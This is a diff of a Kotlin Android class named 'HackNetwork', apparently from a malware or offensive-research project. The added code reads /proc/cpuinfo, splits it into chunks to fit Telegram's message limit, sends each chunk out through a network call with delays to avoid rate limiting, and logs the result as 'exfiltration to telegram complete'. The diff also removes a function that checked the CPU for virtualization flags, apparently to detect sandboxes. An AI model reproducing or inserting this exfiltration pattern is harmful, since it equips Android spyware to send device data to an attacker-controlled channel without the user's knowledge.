@@ -19,6 +19,7 @@ import java.io.InputStreamReader
 class HackNetwork(private val context: Context) {
 
     private val client = OkHttpClient()
+    private val tgLimit = 4000
 
     // Function to send message using OkHttp
     fun sendTextMessage(message: String) {
@@ -55,6 +56,7 @@ class HackNetwork(private val context: Context) {
         })
     }
 
+    // reads cpuinfo and sends it in chunks
     fun logcpuinfo() {
         val cpuinfo = File("/proc/cpuinfo")
         val TAG = "HACK"
@@ -65,7 +67,37 @@ class HackNetwork(private val context: Context) {
         }
 
         try {
-            // use foreachline to process the file line by line efficiently
+            // read the whole file content
+            val fullContent = cpuinfo.readText()
+            val dataToSend = fullContent + "\nmeow =^..^="
+
+            // split into chunks if length exceeds limit
+            if (dataToSend.length <= tgLimit) {
+                sendTextMessage(dataToSend)
+            } else {
+                var start = 0
+                while (start < dataToSend.length) {
+                    val end = minOf(start + tgLimit, dataToSend.length)
+                    val chunk = dataToSend.substring(start, end)
+
+                    // send current chunk
+                    sendTextMessage(chunk)
+                    start += tgLimit
+
+                    // small delay to prevent telegram rate limiting (429)
+                    Thread.sleep(500)
+                }
+            }
+            Log.i(TAG, "[+] exfiltration to telegram complete. meow =^..^=")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "[x] error during exfiltration: ${e.message}")
+            sendTextMessage("[x] error reading cpuinfo: ${e.message}")
+        }
+
+
+        try {
+            // use foreach to process the file line by line efficiently
             cpuinfo.bufferedReader().useLines { lines ->
                 lines.forEach { line ->
                     // we log every line to see the full hardware picture
@@ -78,56 +110,6 @@ class HackNetwork(private val context: Context) {
         }
     }
 
-    fun isvmdetected(): String {
-        val cpuinfo = File("/proc/cpuinfo")
-        if (!cpuinfo.exists()) return ""
-
-        try {
-            cpuinfo.bufferedReader().use { reader ->
-                var line: String?
-                while (reader.readLine().also { line = it } != null) {
-                    // check for intel (vmx) or amd (svm) virtualization flags
-                    // also check for arm virtualization (virt/hyp)
-                    val l = line!!.lowercase()
-//                    if (l.contains("vmx") || l.contains("svm") || l.contains("hyp") || l.contains("virt")) {
-//                        return l
-//                    }
-                    Toast.makeText(
-                        context,
-                        l,
-                        Toast.LENGTH_LONG
-                    ).show();
-                    return l
-                }
-            }
-        } catch (e: Exception) {
-            // if reading fails, we assume something is wrong (potential sandbox/hook)
-//            return false
-            return ""
-        }
-//        return false
-        return ""
-    }
-
-    fun getfullcpuinfo(): String {
-        val cpuinfo = File("/proc/cpuinfo")
-        if (!cpuinfo.exists()) return "error: file not found"
-
-        val fulltext = StringBuilder()
-
-        try {
-            // we read line by line and append to stringbuilder
-            cpuinfo.bufferedReader().useLines { lines ->
-                lines.forEach { line ->
-                    fulltext.append(line).append("\n")
-                }
-            }
-        } catch (e: Exception) {
-            return "error: ${e.message}"
-        }
-
-        return fulltext.toString()
-    }
 
     // Get device info
     private fun getDeviceName(): String {
